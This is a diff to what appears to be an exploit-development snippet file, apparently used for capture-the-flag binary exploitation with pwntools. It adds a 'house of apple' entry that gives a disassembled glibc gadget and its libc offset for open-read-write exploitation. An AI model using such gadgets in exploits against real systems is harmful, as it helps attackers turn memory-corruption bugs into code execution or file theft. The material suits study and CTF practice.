@@ -94,6 +94,18 @@
 			"\tio.interactive()",
 		]
 	},
+	"house of apple magic gadget for ORW": {
+		"prefix": "hoa_orw",
+		"body": [
+			"# 16a06a:       48 8b 6f 48             mov    rbp,QWORD PTR [rdi+0x48]",
+			"# 16a06e:       48 8b 45 18             mov    rax,QWORD PTR [rbp+0x18]",
+			"# 16a072:       4c 8d 6d 10             lea    r13,[rbp+0x10]",
+			"# 16a076:       c7 45 10 00 00 00 00    mov    DWORD PTR [rbp+0x10],0x0",
+			"# 16a07d:       4c 89 ef                mov    rdi,r13",
+			"# 16a080:       ff 50 28                call   QWORD PTR [rax+0x28]",
+			"magic_gadget = libc.address + 0x16a06a"
+		]
+	},
 	"safe-unlink": {
 		"prefix": "unlink",
 		"body": [
